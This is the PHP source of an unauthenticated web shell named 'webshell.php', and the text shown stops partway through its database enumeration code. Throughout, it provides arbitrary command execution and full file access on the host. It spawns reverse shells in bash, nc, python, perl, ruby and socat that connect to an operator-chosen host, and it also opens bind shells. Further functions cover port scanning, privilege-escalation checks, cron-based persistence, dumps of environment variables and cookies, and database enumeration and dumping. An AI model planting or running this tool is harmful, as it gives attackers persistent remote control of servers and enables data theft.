<?php
// webshell.php - A simple web shell for remote command execution and file management

session_start();
error_reporting(0);

define('STORAGE_DIR', sys_get_temp_dir() . '/vibe_shell');
define('JOBS_DIR', STORAGE_DIR . '/jobs');
define('SCRIPTS_DIR', STORAGE_DIR . '/scripts');
define('HISTORY_LIMIT', 500);

if (!is_dir(STORAGE_DIR)) mkdir(STORAGE_DIR, 0755, true);
if (!is_dir(JOBS_DIR)) mkdir(JOBS_DIR, 0755, true);
if (!is_dir(SCRIPTS_DIR)) mkdir(SCRIPTS_DIR, 0755, true);

if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
if (!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();

$action = $_GET['action'] ?? 'ui';

if ($action === 'ui') {
    serveUI();
    exit;
}

header('Content-Type: application/json');

switch ($action) {
    case 'sysinfo': handleSysInfo(); break;
    case 'exec': handleExec(); break;
    case 'browse': handleBrowse(); break;
    case 'upload': handleUpload(); break;
    case 'download': handleDownload(); break;
    case 'delete': handleDelete(); break;
    case 'read': handleRead(); break;
    case 'write': handleWrite(); break;
    case 'mkdir': handleMkdir(); break;
    case 'chmod': handleChmod(); break;
    case 'jobs_list': handleJobsList(); break;
    case 'job_upload': handleJobUpload(); break;
    case 'job_execute': handleJobExecute(); break;
    case 'job_stop': handleJobStop(); break;
    case 'job_output': handleJobOutput(); break;
    case 'job_download': handleJobDownload(); break;
    case 'job_delete': handleJobDelete(); break;
    case 'revshell_spawn': handleRevShellSpawn(); break;
    case 'bindshell_spawn': handleBindShellSpawn(); break;
    case 'port_scan': handlePortScan(); break;
    case 'find_files': handleFindFiles(); break;
    case 'processes': handleProcesses(); break;
    case 'kill_process': handleKillProcess(); break;
    case 'network_info': handleNetworkInfo(); break;
    case 'phpinfo': handlePhpInfo(); break;
    case 'env_dump': handleEnvDump(); break;
    case 'privesc_check': handlePrivescCheck(); break;
    case 'create_cron': handleCreateCron(); break;
    case 'encode': handleEncode(); break;
    case 'sql_connect': handleSqlConnect(); break;
    case 'sql_query': handleSqlQuery(); break;
    case 'sql_enum': handleSqlEnum(); break;
    case 'sql_dump_db': handleSqlDumpDb(); break;
    case 'sql_dump_table': handleSqlDumpTable(); break;
    default:
        echo json_encode(['error' => 'Unknown action']);
}

// === SYSTEM INFO ===
function handleSysInfo() {
    echo json_encode([
        'os' => php_uname(),
        'user' => get_current_user(),
        'uid' => getmyuid(),
        'gid' => getmygid(),
        'cwd' => $_SESSION['cwd'],
        'php' => phpversion(),
        'disabled' => ini_get('disable_functions'),
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'hostname' => gethostname(),
        'disk_free' => disk_free_space('/'),
        'disk_total' => disk_total_space('/'),
    ]);
}

// === COMMAND EXECUTION ===
function handleExec() {
    $cmd = $_POST['cmd'] ?? '';
    if (empty($cmd)) {
        echo json_encode(['error' => 'No command']);
        return;
    }

    if (preg_match('/^\s*cd\s+(.+)$/i', $cmd, $m)) {
        $target = trim($m[1]);
        $newPath = resolvePath($target, $_SESSION['cwd']);
        if (is_dir($newPath)) {
            $_SESSION['cwd'] = realpath($newPath);
            addHistory($cmd);
            echo json_encode(['output' => '', 'cwd' => $_SESSION['cwd']]);
        } else {
            echo json_encode(['error' => "cd: $target: No such directory", 'cwd' => $_SESSION['cwd']]);
        }
        return;
    }

    $fullCmd = sprintf("cd %s 2>&1 && %s 2>&1", escapeshellarg($_SESSION['cwd']), $cmd);
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];

    $proc = proc_open($fullCmd, $descriptors, $pipes);

    if (is_resource($proc)) {
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $exitCode = proc_close($proc);

        addHistory($cmd);

        echo json_encode([
            'output' => $output . $error,
            'exit_code' => $exitCode,
            'cwd' => $_SESSION['cwd']
        ]);
    } else {
        echo json_encode(['error' => 'Failed to execute command']);
    }
}

// === FILE BROWSER ===
function handleBrowse() {
    $path = $_GET['path'] ?? $_SESSION['cwd'];
    $realPath = realpath($path);

    if (!$realPath || !is_dir($realPath)) {
        echo json_encode(['error' => 'Invalid path']);
        return;
    }

    $items = [];
    $entries = @scandir($realPath);

    if ($entries === false) {
        echo json_encode(['error' => 'Permission denied']);
        return;
    }

    if ($realPath !== '/') {
        $items[] = [
            'name' => '..',
            'path' => dirname($realPath),
            'type' => 'dir',
            'size' => 0,
            'perms' => '',
            'modified' => 0,
            'owner' => '',
            'group' => '',
            'readable' => true,
            'writable' => false,
            'executable' => false,
        ];
    }

    foreach ($entries as $entry) {
        if ($entry === '.' || $entry === '..') continue;

        $fullPath = $realPath . '/' . $entry;
        $stat = @stat($fullPath);
        $isDir = is_dir($fullPath);

        $items[] = [
            'name' => $entry,
            'path' => $fullPath,
            'type' => $isDir ? 'dir' : 'file',
            'size' => $isDir ? 0 : ($stat['size'] ?? 0),
            'perms' => substr(sprintf('%o', $stat['mode'] ?? 0), -4),
            'modified' => $stat['mtime'] ?? 0,
            'owner' => function_exists('posix_getpwuid') ? (posix_getpwuid($stat['uid'] ?? 0)['name'] ?? '') : '',
            'group' => function_exists('posix_getgrgid') ? (posix_getgrgid($stat['gid'] ?? 0)['name'] ?? '') : '',
            'readable' => is_readable($fullPath),
            'writable' => is_writable($fullPath),
            'executable' => is_executable($fullPath),
        ];
    }

    usort($items, function($a, $b) {
        if ($a['name'] === '..') return -1;
        if ($b['name'] === '..') return 1;
        if ($a['type'] !== $b['type']) {
            return $a['type'] === 'dir' ? -1 : 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });

    echo json_encode([
        'path' => $realPath,
        'items' => $items
    ]);
}

function handleUpload() {
    if (!isset($_FILES['file'])) {
        echo json_encode(['error' => 'No file uploaded']);
        return;
    }

    $targetDir = $_POST['path'] ?? $_SESSION['cwd'];
    $realDir = realpath($targetDir);

    if (!$realDir || !is_dir($realDir) || !is_writable($realDir)) {
        echo json_encode(['error' => 'Cannot write to directory']);
        return;
    }

    $filename = basename($_FILES['file']['name']);
    $targetPath = $realDir . '/' . $filename;

    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
        @chmod($targetPath, 0644);
        echo json_encode(['success' => true, 'path' => $targetPath]);
    } else {
        echo json_encode(['error' => 'Upload failed']);
    }
}

function handleDownload() {
    $file = $_GET['file'] ?? '';
    $realFile = realpath($file);

    if (!$realFile || !is_file($realFile) || !is_readable($realFile)) {
        header('HTTP/1.1 404 Not Found');
        die('File not found');
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($realFile) . '"');
    header('Content-Length: ' . filesize($realFile));
    readfile($realFile);
    exit;
}

function handleDelete() {
    $path = $_POST['path'] ?? '';
    $realPath = realpath($path);

    if (!$realPath || !file_exists($realPath)) {
        echo json_encode(['error' => 'File not found']);
        return;
    }

    if (is_dir($realPath)) {
        if (@rmdir($realPath)) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'Cannot delete directory (not empty?)']);
        }
    } else {
        if (@unlink($realPath)) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['error' => 'Cannot delete file']);
        }
    }
}

function handleRead() {
    $file = $_GET['file'] ?? '';
    $realFile = realpath($file);

    if (!$realFile || !is_file($realFile) || !is_readable($realFile)) {
        echo json_encode(['error' => 'Cannot read file']);
        return;
    }

    $size = filesize($realFile);
    $sample = file_get_contents($realFile, false, null, 0, 8192);
    $isBinary = preg_match('~[^\x20-\x7E\t\r\n]~', $sample) > 0;

    if ($isBinary) {
        echo json_encode([
            'binary' => true,
            'size' => $size,
            'content' => 'Binary file (' . formatSize($size) . ')'
        ]);
        return;
    }

    $content = file_get_contents($realFile);
    echo json_encode([
        'binary' => false,
        'content' => $content,
        'size' => $size
    ]);
}

function handleWrite() {
    $path = $_POST['path'] ?? '';
    $content = $_POST['content'] ?? '';

    if (empty($path)) {
        echo json_encode(['error' => 'No path specified']);
        return;
    }

    if (file_put_contents($path, $content) !== false) {
        @chmod($path, 0644);
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['error' => 'Cannot write file']);
    }
}

function handleMkdir() {
    $path = $_POST['path'] ?? '';
    if (empty($path)) {
        echo json_encode(['error' => 'No path specified']);
        return;
    }

    if (@mkdir($path, 0755, true)) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['error' => 'Cannot create directory']);
    }
}

function handleChmod() {
    $path = $_POST['path'] ?? '';
    $mode = $_POST['mode'] ?? '';

    if (empty($path) || empty($mode)) {
        echo json_encode(['error' => 'Missing path or mode']);
        return;
    }

    $realPath = realpath($path);
    if (!$realPath) {
        echo json_encode(['error' => 'File not found']);
        return;
    }

    if (@chmod($realPath, octdec($mode))) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['error' => 'Cannot change permissions']);
    }
}

// === JOB MANAGEMENT ===
function handleJobsList() {
    $jobs = [];
    $metaFiles = glob(JOBS_DIR . '/*.meta');

    foreach ($metaFiles as $metaFile) {
        $meta = json_decode(file_get_contents($metaFile), true);
        if (!$meta) continue;

        if (isset($meta['pid']) && $meta['status'] === 'running') {
            if (!isProcessRunning($meta['pid'])) {
                $meta['status'] = 'completed';
                file_put_contents($metaFile, json_encode($meta));
            }
        }

        $outputPath = JOBS_DIR . '/' . $meta['id'] . '.output';
        $meta['output_size'] = file_exists($outputPath) ? filesize($outputPath) : 0;

        $jobs[] = $meta;
    }

    usort($jobs, function($a, $b) {
        return $b['created'] - $a['created'];
    });

    echo json_encode(['jobs' => $jobs]);
}

function handleJobUpload() {
    if (!isset($_FILES['script'])) {
        echo json_encode(['error' => 'No file uploaded']);
        return;
    }

    $name = $_POST['name'] ?? basename($_FILES['script']['name'], '.sh');
    $script = file_get_contents($_FILES['script']['tmp_name']);

    if ($script === false) {
        echo json_encode(['error' => 'Cannot read uploaded file']);
        return;
    }

    $jobId = uniqid('job_');
    createJob($jobId, $name, $script);

    echo json_encode(['success' => true, 'job_id' => $jobId]);
}

function handleJobExecute() {
    $jobId = $_POST['job_id'] ?? '';
    $metaPath = JOBS_DIR . '/' . $jobId . '.meta';

    if (!file_exists($metaPath)) {
        echo json_encode(['error' => 'Job not found']);
        return;
    }

    $meta = json_decode(file_get_contents($metaPath), true);

    if ($meta['status'] === 'running') {
        echo json_encode(['error' => 'Job already running']);
        return;
    }

    $scriptPath = SCRIPTS_DIR . '/' . $jobId . '.sh';
    $outputPath = JOBS_DIR . '/' . $jobId . '.output';

    $cmd = sprintf(
        'nohup bash %s > %s 2>&1 & echo $!',
        escapeshellarg($scriptPath),
        escapeshellarg($outputPath)
    );

    $pid = trim(shell_exec($cmd));

    if ($pid && is_numeric($pid)) {
        $meta['pid'] = (int)$pid;
        $meta['status'] = 'running';
        $meta['started'] = time();
        file_put_contents($metaPath, json_encode($meta));

        echo json_encode(['success' => true, 'pid' => $pid]);
    } else {
        echo json_encode(['error' => 'Failed to start job']);
    }
}

function handleJobStop() {
    $jobId = $_POST['job_id'] ?? '';
    $metaPath = JOBS_DIR . '/' . $jobId . '.meta';

    if (!file_exists($metaPath)) {
        echo json_encode(['error' => 'Job not found']);
        return;
    }

    $meta = json_decode(file_get_contents($metaPath), true);

    if (!isset($meta['pid'])) {
        echo json_encode(['error' => 'Job has no PID']);
        return;
    }

    @shell_exec('kill -9 ' . (int)$meta['pid'] . ' 2>/dev/null');

    $meta['status'] = 'stopped';
    file_put_contents($metaPath, json_encode($meta));

    echo json_encode(['success' => true]);
}

function handleJobOutput() {
    $jobId = $_GET['job_id'] ?? '';
    $offset = (int)($_GET['offset'] ?? 0);

    $outputPath = JOBS_DIR . '/' . $jobId . '.output';

    if (!file_exists($outputPath)) {
        echo json_encode(['output' => '', 'size' => 0]);
        return;
    }

    $size = filesize($outputPath);
    $content = '';

    if ($offset < $size) {
        $fp = fopen($outputPath, 'r');
        fseek($fp, $offset);
        $content = fread($fp, $size - $offset);
        fclose($fp);
    }

    echo json_encode([
        'output' => $content,
        'size' => $size,
        'offset' => $size
    ]);
}

function handleJobDownload() {
    $jobId = $_GET['job_id'] ?? '';
    $outputPath = JOBS_DIR . '/' . $jobId . '.output';

    if (!file_exists($outputPath)) {
        header('HTTP/1.1 404 Not Found');
        die('Output not found');
    }

    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="job_' . $jobId . '_output.txt"');
    header('Content-Length: ' . filesize($outputPath));
    readfile($outputPath);
    exit;
}

function handleJobDelete() {
    $jobId = $_POST['job_id'] ?? '';

    @unlink(JOBS_DIR . '/' . $jobId . '.meta');
    @unlink(JOBS_DIR . '/' . $jobId . '.output');
    @unlink(SCRIPTS_DIR . '/' . $jobId . '.sh');

    echo json_encode(['success' => true]);
}

// === REVERSE SHELL ===
function handleRevShellSpawn() {
    $host = $_POST['host'] ?? '';
    $port = (int)($_POST['port'] ?? 0);
    $method = $_POST['method'] ?? 'bash';

    if (empty($host) || $port <= 0) {
        echo json_encode(['error' => 'Invalid host or port']);
        return;
    }

    $shells = [
        'bash' => "bash -i >& /dev/tcp/{$host}/{$port} 0>&1",
        'bash_exec' => "exec 5<>/dev/tcp/{$host}/{$port};cat <&5 | while read line; do \$line 2>&5 >&5; done",
        'nc' => "nc -e /bin/bash {$host} {$port}",
        'nc_pipe' => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {$host} {$port} >/tmp/f",
        'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$host}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        'python3' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{$host}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        'php' => "php -r '\$sock=fsockopen(\"{$host}\",{$port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        'perl' => "perl -e 'use Socket;\$i=\"{$host}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'",
        'ruby' => "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{$host}\",{$port});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        'socat' => "socat TCP:{$host}:{$port} EXEC:/bin/bash",
    ];

    if (!isset($shells[$method])) {
        echo json_encode(['error' => 'Unknown method']);
        return;
    }

    $script = "#!/bin/bash\n" . $shells[$method];
    $jobId = uniqid('revshell_');
    createJob($jobId, "RevShell_{$method}_{$host}:{$port}", $script);

    $scriptPath = SCRIPTS_DIR . '/' . $jobId . '.sh';
    $outputPath = JOBS_DIR . '/' . $jobId . '.output';

    $cmd = sprintf(
        'nohup bash %s > %s 2>&1 & echo $!',
        escapeshellarg($scriptPath),
        escapeshellarg($outputPath)
    );

    $pid = trim(shell_exec($cmd));

    $metaPath = JOBS_DIR . '/' . $jobId . '.meta';
    $meta = json_decode(file_get_contents($metaPath), true);
    $meta['pid'] = (int)$pid;
    $meta['status'] = 'running';
    $meta['started'] = time();
    file_put_contents($metaPath, json_encode($meta));

    echo json_encode([
        'success' => true,
        'job_id' => $jobId,
        'pid' => $pid,
        'command' => $shells[$method]
    ]);
}

// === BIND SHELL ===
function handleBindShellSpawn() {
    $port = (int)($_POST['port'] ?? 0);
    $method = $_POST['method'] ?? 'nc';

    if ($port <= 0) {
        echo json_encode(['error' => 'Invalid port']);
        return;
    }

    $shells = [
        'nc' => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l {$port} >/tmp/f",
        'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{$port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        'python3' => "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{$port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        'socat' => "socat TCP-LISTEN:{$port},reuseaddr,fork EXEC:/bin/bash",
    ];

    if (!isset($shells[$method])) {
        echo json_encode(['error' => 'Unknown method']);
        return;
    }

    $script = "#!/bin/bash\n" . $shells[$method];
    $jobId = uniqid('bindshell_');
    createJob($jobId, "BindShell_{$method}_{$port}", $script);

    $scriptPath = SCRIPTS_DIR . '/' . $jobId . '.sh';
    $outputPath = JOBS_DIR . '/' . $jobId . '.output';

    $cmd = sprintf(
        'nohup bash %s > %s 2>&1 & echo $!',
        escapeshellarg($scriptPath),
        escapeshellarg($outputPath)
    );

    $pid = trim(shell_exec($cmd));

    $metaPath = JOBS_DIR . '/' . $jobId . '.meta';
    $meta = json_decode(file_get_contents($metaPath), true);
    $meta['pid'] = (int)$pid;
    $meta['status'] = 'running';
    $meta['started'] = time();
    file_put_contents($metaPath, json_encode($meta));

    echo json_encode([
        'success' => true,
        'job_id' => $jobId,
        'pid' => $pid,
        'command' => $shells[$method]
    ]);
}

// === PORT SCANNER ===
function handlePortScan() {
    $target = $_POST['target'] ?? '';
    $ports = $_POST['ports'] ?? '21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443';

    if (empty($target)) {
        echo json_encode(['error' => 'No target specified']);
        return;
    }

    $portList = explode(',', $ports);
    $results = [];

    foreach ($portList as $port) {
        $port = (int)trim($port);
        if ($port <= 0) continue;

        $fp = @fsockopen($target, $port, $errno, $errstr, 2);
        if ($fp) {
            $results[] = ['port' => $port, 'status' => 'open'];
            fclose($fp);
        }
    }

    echo json_encode(['success' => true, 'results' => $results]);
}

// === FILE SEARCH ===
function handleFindFiles() {
    $path = $_POST['path'] ?? '/';
    $name = $_POST['name'] ?? '';
    $content = $_POST['content'] ?? '';

    if (empty($name) && empty($content)) {
        echo json_encode(['error' => 'Specify name or content pattern']);
        return;
    }

    $script = "#!/bin/bash\n";

    if (!empty($name)) {
        $script .= "find " . escapeshellarg($path) . " -name " . escapeshellarg($name) . " 2>/dev/null\n";
    }

    if (!empty($content)) {
        $script .= "grep -r " . escapeshellarg($content) . " " . escapeshellarg($path) . " 2>/dev/null\n";
    }

    $jobId = uniqid('find_');
    createJob($jobId, "Find: {$name}{$content}", $script);

    $scriptPath = SCRIPTS_DIR . '/' . $jobId . '.sh';
    $outputPath = JOBS_DIR . '/' . $jobId . '.output';

    $cmd = sprintf(
        'nohup bash %s > %s 2>&1 & echo $!',
        escapeshellarg($scriptPath),
        escapeshellarg($outputPath)
    );

    $pid = trim(shell_exec($cmd));

    $metaPath = JOBS_DIR . '/' . $jobId . '.meta';
    $meta = json_decode(file_get_contents($metaPath), true);
    $meta['pid'] = (int)$pid;
    $meta['status'] = 'running';
    $meta['started'] = time();
    file_put_contents($metaPath, json_encode($meta));

    echo json_encode(['success' => true, 'job_id' => $jobId]);
}

// === PROCESS MANAGEMENT ===
function handleProcesses() {
    $output = shell_exec('ps auxf 2>&1');
    echo json_encode(['output' => $output]);
}

function handleKillProcess() {
    $pid = (int)($_POST['pid'] ?? 0);
    if ($pid <= 0) {
        echo json_encode(['error' => 'Invalid PID']);
        return;
    }

    @shell_exec("kill -9 {$pid} 2>/dev/null");
    echo json_encode(['success' => true]);
}

// === NETWORK INFO ===
function handleNetworkInfo() {
    $info = [
        'interfaces' => shell_exec('ip addr 2>&1 || ifconfig 2>&1'),
        'routes' => shell_exec('ip route 2>&1 || route -n 2>&1'),
        'connections' => shell_exec('netstat -tunapl 2>&1 || ss -tunapl 2>&1'),
        'hostname' => gethostname(),
    ];

    echo json_encode($info);
}

// === PHP INFO ===
function handlePhpInfo() {
    ob_start();
    phpinfo();
    $output = ob_get_clean();
    echo json_encode(['html' => $output]);
}

// === ENV DUMP ===
function handleEnvDump() {
    echo json_encode([
        'env' => $_ENV,
        'server' => $_SERVER,
        'get' => $_GET,
        'post' => $_POST,
        'cookie' => $_COOKIE,
    ]);
}

// === PRIVESC CHECK ===
function handlePrivescCheck() {
    $checks = [];

    // SUID binaries
    $checks['suid'] = shell_exec('find / -perm -4000 -type f 2>/dev/null | head -20');

    // Sudo rights
    $checks['sudo'] = shell_exec('sudo -l 2>&1');

    // Writable /etc/passwd
    $checks['passwd_writable'] = is_writable('/etc/passwd') ? 'YES - WRITABLE!' : 'No';

    // Cron jobs
    $checks['crontab'] = shell_exec('crontab -l 2>&1');

    // Kernel version
    $checks['kernel'] = shell_exec('uname -a 2>&1');

    // World-writable dirs
    $checks['writable_dirs'] = shell_exec('find / -type d -perm -0002 2>/dev/null | head -20');

    echo json_encode($checks);
}

// === CRON JOB ===
function handleCreateCron() {
    $command = $_POST['command'] ?? '';
    $schedule = $_POST['schedule'] ?? '* * * * *';

    if (empty($command)) {
        echo json_encode(['error' => 'No command specified']);
        return;
    }

    $cronLine = "$schedule $command\n";
    $output = shell_exec("(crontab -l 2>/dev/null; echo '$cronLine') | crontab - 2>&1");

    echo json_encode(['success' => true, 'output' => $output]);
}

// === ENCODING ===
function handleEncode() {
    $text = $_POST['text'] ?? '';
    $type = $_POST['type'] ?? 'base64';

    if (empty($text)) {
        echo json_encode(['error' => 'No text provided']);
        return;
    }

    $result = '';

    switch ($type) {
        case 'base64_encode':
            $result = base64_encode($text);
            break;
        case 'base64_decode':
            $result = base64_decode($text);
            break;
        case 'url_encode':
            $result = urlencode($text);
            break;
        case 'url_decode':
            $result = urldecode($text);
            break;
        case 'hex_encode':
            $result = bin2hex($text);
            break;
        case 'hex_decode':
            $result = hex2bin($text);
            break;
    }

    echo json_encode(['result' => $result]);
}

// === SQL CLIENT ===
function handleSqlConnect() {
    $type = $_POST['type'] ?? 'mysql';
    $host = $_POST['host'] ?? 'localhost';
    $port = $_POST['port'] ?? '';
    $user = $_POST['user'] ?? '';
    $pass = $_POST['pass'] ?? '';
    $db = $_POST['db'] ?? '';

    $conn = null;

    try {
        if ($type === 'mysql') {
            $port = $port ?: 3306;
            if (function_exists('mysqli_connect')) {
                $conn = @mysqli_connect($host, $user, $pass, $db, $port);
                if ($conn) {
                    $_SESSION['sql_conn'] = [
                        'type' => 'mysql',
                        'host' => $host,
                        'port' => $port,
                        'user' => $user,
                        'pass' => $pass,
                        'db' => $db
                    ];
                    mysqli_close($conn);
                    echo json_encode(['success' => true, 'message' => 'Connected to MySQL']);
                } else {
                    echo json_encode(['error' => 'Connection failed: ' . mysqli_connect_error()]);
                }
            } else {
                echo json_encode(['error' => 'MySQLi extension not available']);
            }
        } elseif ($type === 'pgsql') {
            $port = $port ?: 5432;
            if (function_exists('pg_connect')) {
                $connStr = "host=$host port=$port dbname=$db user=$user password=$pass";
                $conn = @pg_connect($connStr);
                if ($conn) {
                    $_SESSION['sql_conn'] = [
                        'type' => 'pgsql',
                        'host' => $host,
                        'port' => $port,
                        'user' => $user,
                        'pass' => $pass,
                        'db' => $db
                    ];
                    pg_close($conn);
                    echo json_encode(['success' => true, 'message' => 'Connected to PostgreSQL']);
                } else {
                    echo json_encode(['error' => 'PostgreSQL connection failed']);
                }
            } else {
                echo json_encode(['error' => 'PostgreSQL extension not available']);
            }
        } elseif ($type === 'sqlite') {
            if (function_exists('sqlite_open') || class_exists('SQLite3')) {
                if (!file_exists($db)) {
                    echo json_encode(['error' => 'SQLite database file not found']);
                    return;
                }
                $_SESSION['sql_conn'] = [
                    'type' => 'sqlite',
                    'db' => $db
                ];
                echo json_encode(['success' => true, 'message' => 'Connected to SQLite']);
            } else {
                echo json_encode(['error' => 'SQLite extension not available']);
            }
        } else {
            echo json_encode(['error' => 'Unknown database type']);
        }
    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
}

function handleSqlQuery() {
    if (!isset($_SESSION['sql_conn'])) {
        echo json_encode(['error' => 'Not connected to database']);
        return;
    }

    $query = $_POST['query'] ?? '';
    if (empty($query)) {
        echo json_encode(['error' => 'No query provided']);
        return;
    }

    $conn_info = $_SESSION['sql_conn'];
    $results = [];
    $affectedRows = 0;

    try {
        if ($conn_info['type'] === 'mysql') {
            $conn = @mysqli_connect(
                $conn_info['host'],
                $conn_info['user'],
                $conn_info['pass'],
                $conn_info['db'],
                $conn_info['port']
            );

            if (!$conn) {
                echo json_encode(['error' => 'Failed to reconnect: ' . mysqli_connect_error()]);
                return;
            }

            $result = mysqli_query($conn, $query);

            if ($result === false) {
                echo json_encode(['error' => mysqli_error($conn)]);
                mysqli_close($conn);
                return;
            }

            if ($result === true) {
                $affectedRows = mysqli_affected_rows($conn);
                echo json_encode([
                    'success' => true,
                    'affected_rows' => $affectedRows,
                    'message' => "Query executed successfully. Affected rows: $affectedRows"
                ]);
            } else {
                while ($row = mysqli_fetch_assoc($result)) {
                    $results[] = $row;
                }
                mysqli_free_result($result);

                echo json_encode([
                    'success' => true,
                    'rows' => count($results),
                    'data' => $results
                ]);
            }

            mysqli_close($conn);

        } elseif ($conn_info['type'] === 'pgsql') {
            $connStr = sprintf(
                "host=%s port=%s dbname=%s user=%s password=%s",
                $conn_info['host'],
                $conn_info['port'],
                $conn_info['db'],
                $conn_info['user'],
                $conn_info['pass']
            );

            $conn = @pg_connect($connStr);
            if (!$conn) {
                echo json_encode(['error' => 'Failed to reconnect to PostgreSQL']);
                return;
            }

            $result = pg_query($conn, $query);

            if ($result === false) {
                echo json_encode(['error' => pg_last_error($conn)]);
                pg_close($conn);
                return;
            }

            $affectedRows = pg_affected_rows($result);

            if (pg_num_fields($result) > 0) {
                while ($row = pg_fetch_assoc($result)) {
                    $results[] = $row;
                }

                echo json_encode([
                    'success' => true,
                    'rows' => count($results),
                    'data' => $results
                ]);
            } else {
                echo json_encode([
                    'success' => true,
                    'affected_rows' => $affectedRows,
                    'message' => "Query executed successfully. Affected rows: $affectedRows"
                ]);
            }

            pg_close($conn);

        } elseif ($conn_info['type'] === 'sqlite') {
            if (class_exists('SQLite3')) {
                $conn = new SQLite3($conn_info['db']);
                $result = $conn->query($query);

                if ($result === false) {
                    echo json_encode(['error' => $conn->lastErrorMsg()]);
                    $conn->close();
                    return;
                }

                while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                    $results[] = $row;
                }

                if (count($results) > 0) {
                    echo json_encode([
                        'success' => true,
                        'rows' => count($results),
                        'data' => $results
                    ]);
                } else {
                    $changes = $conn->changes();
                    echo json_encode([
                        'success' => true,
                        'affected_rows' => $changes,
                        'message' => "Query executed successfully. Affected rows: $changes"
                    ]);
                }

                $conn->close();
            } else {
                echo json_encode(['error' => 'SQLite3 class not available']);
            }
        }

    } catch (Exception $e) {
        echo json_encode(['error' => $e->getMessage()]);
    }
}

function handleSqlEnum() {
    if (!isset($_SESSION['sql_conn'])) {
        echo json_encode(['error' => 'Not connected to database']);
        return;
    }

    $enumType = $_POST['enum_type'] ?? '';
    $conn_info = $_SESSION['sql_conn'];
    $results = [];

    try {
        if ($conn_info['type'] === 'mysql') {
            $conn = @mysqli_connect(
                $conn_info['host'],
                $conn_info['user'],
                $conn_info['pass'],
                $conn_info['db'],
                $conn_info['port']
            );

            if (!$conn) {
                echo json_encode(['error' => 'Failed to reconnect']);
                return;
            }

            switch ($enumType) {
                case 'databases':
                    $result = mysqli_query($conn, "SHOW DATABASES");
                    while ($row = mysqli_fetch_assoc($result)) {
                        $results[] = $row;
                    }
                    break;

                case 'tables':
                    $result = mysqli_query($conn, "SHOW TABLES");
                    while ($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
                        $results[] = ['table' => $row[0]];
                    }
                    break;

                case 'users':
                    $result = mysqli_query($conn, "SELECT user, host FROM mysql.user");
                    if ($result) {
                        while ($row = mysqli_fetch_assoc($result)) {
                            $results[] = $row;
                        }
                    }
                    break;

                case 'version':
                    $result = mysqli_query($conn, "SELECT VERSION() as version, USER() as user, DATABASE() as database");
                    $results = mysqli_fetch_assoc($result);
                    break;

                case 'privileges':
                    $result = mysqli_query($conn, "SHOW GRANTS");
                    while ($row = mysqli_fetch_array($result, MYSQLI_NUM)) {
                        $results[] = ['grant' => $row[0]];
                    }
                    break;

                case 'columns':
                    $result = mysqli_query($conn, "SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema = DATABASE() ORDER BY table_name, ordinal_position");
                    if ($result) {
                        while ($row = mysqli_fetch_assoc($result)) {
                            $results[] = $row;
                        }
                    }
                    break;
            }

            mysqli_close($conn);

        } elseif ($conn_info['type'] === 'pgsql') {
            $connStr = sprintf(
                "host=%s port=%s dbname=%s user=%s password=%s",
                $conn_info['host'],
                $conn_info['port'],
                $conn_info['db'],
                $conn_info['user'],
                $conn_info['pass']
            );

            $conn = @pg_connect($connStr);

            switch ($enumType) {
                case 'databases':
                    $result = pg_query($conn, "SELECT datname FROM pg_database WHERE datistemplate = false");
                    while ($row = pg_fetch_assoc($result)) {
                        $results[] = $row;
                    }
                    break;

                case 'tables':
                    $result = pg_query($conn, "SELECT tablename FROM pg_tables WHERE schemaname = 'public'");
                    while ($row = pg_fetch_assoc($result)) {
                        $results[] = $row;
                    }
                    break;

                case 'users':
                    $result = pg_query($conn, "SELECT usename, usesuper, usecreatedb FROM pg_user");
